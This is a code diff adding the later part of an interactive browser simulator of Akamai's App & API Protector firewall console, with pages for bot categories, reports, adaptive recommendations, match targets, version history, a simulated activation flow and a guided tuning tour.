+        <h1 class="page-title">Bot Manager</h1>
+        <div class="page-sub">Categorize and govern automated traffic. Akamai's directory ships ~1,500 known bot signatures.</div>
+      </div>
+      <button class="btn primary">+ Define custom bot</button>
+    </div>
+    <div class="card">
+      <table class="table">
+        <thead><tr><th>CATEGORY</th><th>KIND</th><th>ACTION</th><th>BOTS IDENTIFIED</th></tr></thead>
+        <tbody>
+        ${STATE.botCategories.map(b => `
+          <tr>
+            <td><b>${b.name}</b></td>
+            <td><span class="pill ${b.cat==='good'?'active':b.cat==='bad'?'deny':'monitor'}">${b.cat}</span></td>
+            <td>
+              <select class="action-select" onchange="botAction('${b.name}', this.value)">
+                <option value="allow" ${b.action==='allow'?'selected':''}>Allow</option>
+                <option value="alert" ${b.action==='alert'?'selected':''}>Alert</option>
+                <option value="deny"  ${b.action==='deny' ?'selected':''}>Deny</option>
+                <option value="challenge">Challenge (TJS)</option>
+              </select>
+            </td>
+            <td class="mono">${fmt(120 + Math.floor(Math.random()*900))}</td>
+          </tr>
+        `).join('')}
+        </tbody>
+      </table>
+    </div>
+  </div>`;
+}
+function wireBots() {}
+function botAction(name, val) {
+  const b = STATE.botCategories.find(b=>b.name===name);
+  b.action = val;
+  STATE.pendingChanges++;
+  toast('Bot category updated', `${name} → ${val.toUpperCase()}`, 'ok');
+}
+
+/* ----- Reports ----- */
+function renderReports() {
+  const total = STATE.metrics.totalReq || 1;
+  const groupsSorted = [...STATE.attackGroups].sort((a,b)=>b.triggers-a.triggers);
+  return `
+  <div class="page">
+    <div class="page-head">
+      <div>
+        <h1 class="page-title">Reports</h1>
+        <div class="page-sub">Aggregated activity since this session began.</div>
+      </div>
+      <div class="btn-row">
+        <button class="btn ghost">Range · Last 1h</button>
+        <button class="btn ghost">PDF</button>
+      </div>
+    </div>
+
+    <div class="stat-grid">
+      <div class="stat"><div class="label">Requests</div><div class="value mono">${fmt(STATE.metrics.totalReq)}</div></div>
+      <div class="stat"><div class="label">Blocked</div><div class="value mono" style="color:var(--danger)">${fmt(STATE.metrics.totalBlocked)}</div></div>
+      <div class="stat"><div class="label">Alerts</div><div class="value mono" style="color:var(--warn)">${fmt(STATE.metrics.totalAlerts)}</div></div>
+      <div class="stat"><div class="label">False+</div><div class="value mono" style="color:var(--info)">${fmt(STATE.metrics.falsePositives)}</div></div>
+    </div>
+
+    <div class="card mb12">
+      <div class="card-head"><div class="card-title">Triggers by Attack Group</div></div>
+      <div class="card-body">
+        ${groupsSorted.map(g => {
+          const pct = (g.triggers / total * 100);
+          return `
+          <div class="row-flex mb12">
+            <div style="width:200px;">${g.name}</div>
+            <div style="flex:1; background:var(--bg-3); height:10px; border-radius:5px; overflow:hidden;">
+              <div style="width:${Math.min(100,pct*4).toFixed(1)}%;height:100%;background:var(--accent);"></div>
+            </div>
+            <div class="mono" style="width:80px;text-align:right;color:var(--text-1);">${fmt(g.triggers)}</div>
+          </div>
+          `;
+        }).join('')}
+      </div>
+    </div>
+  </div>`;
+}
+
+/* ----- Adaptive Engine ----- */
+function renderAdaptive() {
+  return `
+  <div class="page">
+    <div class="page-head">
+      <div>
+        <h1 class="page-title">Adaptive Security Engine</h1>
+        <div class="page-sub">Akamai-managed recommendations based on your traffic patterns. Apply or dismiss to refine your posture.</div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="rec-panel">
+        ${STATE.recommendations.map(r => `
+          <div class="rec-item ${r.kind}">
+            <div class="head">${r.applied?'✓':'⚠'} ${r.title}</div>
+            <div class="body">${r.body}</div>
+            ${r.applied
+              ? `<div class="applied">Applied to staging config</div>`
+              : `<div class="btn-row"><button class="btn primary sm" onclick="applyRec('${r.id}')">Apply</button><button class="btn ghost sm">Dismiss</button></div>`
+            }
+          </div>
+        `).join('')}
+      </div>
+    </div>
+  </div>`;
+}
+function wireAdaptive() {}
+
+/* ----- Match Targets ----- */
+function renderSettings() {
+  return `
+  <div class="page">
+    <div class="page-head">
+      <div>
+        <h1 class="page-title">Match Targets</h1>
+        <div class="page-sub">Define which traffic this security configuration applies to.</div>
+      </div>
+      <button class="btn primary">+ New match target</button>
+    </div>
+    <div class="card">
+      <table class="table">
+        <thead><tr><th>NAME</th><th>HOSTNAMES</th><th>PATHS</th><th>POLICY</th></tr></thead>
+        <tbody>
+          <tr><td><b>Storefront Web</b></td><td class="mono">www.akamai-corp.example</td><td class="mono">/*</td><td><span class="pill active">Default Policy</span></td></tr>
+          <tr><td><b>API Gateway</b></td><td class="mono">api.akamai-corp.example</td><td class="mono">/api/*</td><td><span class="pill active">API Strict</span></td></tr>
+          <tr><td><b>Static CDN</b></td><td class="mono">static.akamai-corp.example</td><td class="mono">/*</td><td><span class="pill none">No Inspection</span></td></tr>
+          <tr><td><b>Admin Console</b></td><td class="mono">admin.akamai-corp.example</td><td class="mono">/*</td><td><span class="pill active">Admin (IP-locked)</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>`;
+}
+
+/* ----- Version History ----- */
+function renderHistory() {
+  return `
+  <div class="page">
+    <div class="page-head">
+      <div>
+        <h1 class="page-title">Version History</h1>
+        <div class="page-sub">Every Save creates a new version; activation promotes a version to Staging or Production.</div>
+      </div>
+    </div>
+    <div class="card">
+      <table class="table">
+        <thead><tr><th>VERSION</th><th>NOTES</th><th>BY</th><th>STAGING</th><th>PROD</th><th></th></tr></thead>
+        <tbody>
+          <tr><td class="mono">v17</td><td>Working copy (this session)</td><td>sec-eng@</td><td><span class="pill active">current</span></td><td>—</td><td><button class="btn ghost sm">Diff</button></td></tr>
+          <tr><td class="mono">v16</td><td>Raised LFI sens 5→6; added IP allow-list</td><td>sec-eng@</td><td>—</td><td><span class="pill active">current</span></td><td><button class="btn ghost sm">Diff</button></td></tr>
+          <tr><td class="mono">v15</td><td>Initial KRS-3.3 upgrade</td><td>platform@</td><td>—</td><td>—</td><td><button class="btn ghost sm">Diff</button></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>`;
+}
+
+/* =============================================================
+   ACTIVATION MODAL
+   ============================================================= */
+function openActivate() {
+  const o = $('#overlay');
+  o.innerHTML = `
+    <div class="modal-backdrop" onclick="if(event.target===this) closeActivate()">
+      <div class="modal">
+        <div style="padding:16px 20px;border-bottom:1px solid var(--line);">
+          <div style="font-family:'Space Grotesk';font-weight:600;font-size:16px;">Activate to ${STATE.env.toUpperCase()}</div>
+          <div class="small text-2">${STATE.pendingChanges} pending change${STATE.pendingChanges===1?'':'s'} will be deployed to the Akamai edge.</div>
+        </div>
+        <div style="padding:18px 20px;">
+          <div class="field"><div class="field-label">Activation note</div>
+            <input class="input" id="actNote" placeholder="e.g. Tune XSS exception for notes endpoint" /></div>
+          <div class="field"><div class="field-label">Network</div>
+            <div class="row-flex gap8 mt8">
+              <label class="small"><input type="radio" name="net" checked /> Staging (rolls in ~3 min)</label>
+              <label class="small"><input type="radio" name="net" /> Production (rolls in ~10 min)</label>
+            </div>
+          </div>
+          <div class="progress-bar" id="actBar" style="display:none;"><div class="progress-fill" id="actFill" style="width:0%;"></div></div>
+        </div>
+        <div style="padding:12px 20px;border-top:1px solid var(--line);display:flex;justify-content:flex-end;gap:8px;">
+          <button class="btn ghost" onclick="closeActivate()">Cancel</button>
+          <button class="btn primary" onclick="doActivate()">Activate</button>
+        </div>
+      </div>
+    </div>
+  `;
+}
+function closeActivate() { $('#overlay').innerHTML = ''; }
+function doActivate() {
+  $('#actBar').style.display = 'block';
+  let p = 0;
+  const t = setInterval(() => {
+    p += 8 + Math.random()*15;
+    if (p >= 100) {
+      p = 100;
+      $('#actFill').style.width = '100%';
+      clearInterval(t);
+      setTimeout(() => {
+        closeActivate();
+        STATE.pendingChanges = 0;
+        toast('Activation complete', `Config rolled to ${STATE.env.toUpperCase()} on 250k+ edge servers.`, 'ok');
+      }, 500);
+    } else {
+      $('#actFill').style.width = p + '%';
+    }
+  }, 220);
+}
+
+/* =============================================================
+   GUIDED TOUR
+   ============================================================= */
+const TOUR = [
+  {
+    title: 'Welcome to the App & API Protector simulator',
+    body: `This is an interactive simulation of <strong>Akamai App &amp; API Protector</strong> (formerly Kona Site Defender + Bot Manager). You're seeing a live traffic feed against a fake site <code>www.akamai-corp.example</code>. Roughly <strong>6%</strong> of requests are simulated attacks and <strong>4%</strong> are false-positive candidates — so you'll have plenty to tune.`,
+    page: 'dashboard'
+  },
+  {
+    title: 'Step 1 — Read the live feed',
+    body: `Each row is a request hitting the edge. The <strong>rightmost column</strong> shows the action the WAF took (ALLOW / ALERT / DENY). Click any row to open the <strong>Request Inspector</strong> and see the decoded payload, the matched rule group, and quick-actions.`,
+    page: 'dashboard'
+  },
+  {
+    title: 'Step 2 — Tune an attack group',
+    body: `Open <strong>Alert Tuning</strong>. Each row is an attack group (SQLi, XSS, LFI, etc.). For each one you can: change the <strong>action</strong> (alert / deny / none), adjust the <strong>sensitivity slider</strong> (1–10), and add an <strong>exception</strong> for a specific endpoint that's producing false positives. <br><br>Try this: set <code>SQL Injection</code> to <strong>Deny</strong>, then watch the feed.`,
+    page: 'tuning'
+  },
+  {
+    title: 'Step 3 — Apply an Adaptive recommendation',
+    body: `On the right side of Alert Tuning, the <strong>Adaptive Security Engine</strong> proposes changes based on traffic patterns it observed. Click <strong>Apply</strong> on the XSS recommendation — it will scope the rule to exclude your <code>/api/v1/notes</code> endpoint so legitimate markdown saves stop firing.`,
+    page: 'tuning'
+  },
+  {
+    title: 'Step 4 — Rate Controls & Custom Rules',
+    body: `Rate Controls block clients that exceed thresholds (e.g. <code>5 login attempts per 60s → deny</code>). Custom Rules let you write your own match conditions and they run <strong>before</strong> the WAF — useful for allow-listing internal IPs or blocking known scanners outright.`,
+    page: 'rate'
+  },
+  {
+    title: 'Step 5 — Stage, then activate',
+    body: `Every change increments your <strong>pending changes</strong> counter. Click <strong>Activate</strong> top-right to roll the config to <strong>Staging</strong> first (always), then to <strong>Production</strong>. Real Akamai activations take a few minutes to propagate to the global edge.`,
+    page: 'history'
+  },
+  {
+    title: `You're ready`,
+    body: `Explore freely. The traffic feed is live, all changes affect the simulated WAF's decisions in real time, and the recommendation engine will surface tunings as you generate data. Have fun.`,
+    page: 'dashboard'
+  }
+];
+
+function startTour(step) {
+  STATE.tourStep = step;
+  navigate(TOUR[step].page);
+  renderTour();
+}
+function renderTour() {
+  const s = TOUR[STATE.tourStep];
+  if (!s) { $('#overlay').innerHTML = ''; return; }
+  $('#overlay').innerHTML = `
+    <div class="tour-backdrop">
+      <div class="tour-card">
+        <div class="tour-head">
+          <span class="tour-step">${STATE.tourStep + 1} / ${TOUR.length}</span>
+          <div class="tour-title">${s.title}</div>
+        </div>
+        <div class="tour-body">${s.body}</div>
+        <div class="tour-foot">
+          <div class="tour-progress">
+            ${TOUR.map((_,i) => `<div class="dot ${i === STATE.tourStep ? 'active' : i < STATE.tourStep ? 'done' : ''}"></div>`).join('')}
+          </div>
+          <div class="btn-row">
+            ${STATE.tourStep > 0 ? `<button class="btn ghost" onclick="startTour(${STATE.tourStep - 1})">← Back</button>` : ''}
+            <button class="btn ghost" onclick="$('#overlay').innerHTML=''">Skip</button>
+            ${STATE.tourStep < TOUR.length - 1
+              ? `<button class="btn primary" onclick="startTour(${STATE.tourStep + 1})">Next →</button>`
+              : `<button class="btn primary" onclick="$('#overlay').innerHTML=''">Finish</button>`}
+          </div>
+        </div>
+      </div>
+    </div>
+  `;
+}
+
+/* =============================================================
+   BOOT
+   ============================================================= */
+navigate('dashboard');
+startSim();
+setTimeout(() => startTour(0), 800);
+</script>
+</body>
+</html>
